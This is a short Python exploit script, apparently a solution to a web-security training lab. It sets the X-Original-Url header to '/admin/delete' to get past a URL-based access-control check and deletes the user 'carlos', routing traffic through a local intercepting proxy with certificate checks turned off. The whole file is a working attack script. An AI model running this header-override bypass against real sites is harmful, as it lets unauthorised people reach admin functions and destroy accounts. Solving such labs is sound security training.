import requests
import sys
import urllib3
from bs4 import BeautifulSoup
from math import ceil

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy = {'http': 'http://127.0.0.1:8080', "https": "http://127.0.0.1:8080"}


def delete_carlos(url, session):
    headers = {"X-Original-Url": "/admin/delete"}
    print("[*] Configuring the request with the needed headers")
    delete_carlos_response = session.get(url + "/login?username=carlos",
                                         verify=False,
                                         proxies=proxy,
                                         headers=headers,
                                         allow_redirects=False)
    if delete_carlos_response.status_code == 302:
        print("[*] Carlos's account was deleted Successfully")


def main():
    if len(sys.argv) != 2:
        print("[*] Wrong tool Usage!")
        print(f"[*] Usage {sys.argv[0]} <url>")
        print(f"[*] Example {sys.argv[0]} https://example.com ")
        sys.exit(-1)
    else:
        session = requests.Session()

        delete_carlos(sys.argv[1], session)


if __name__ == "__main__":
    main()
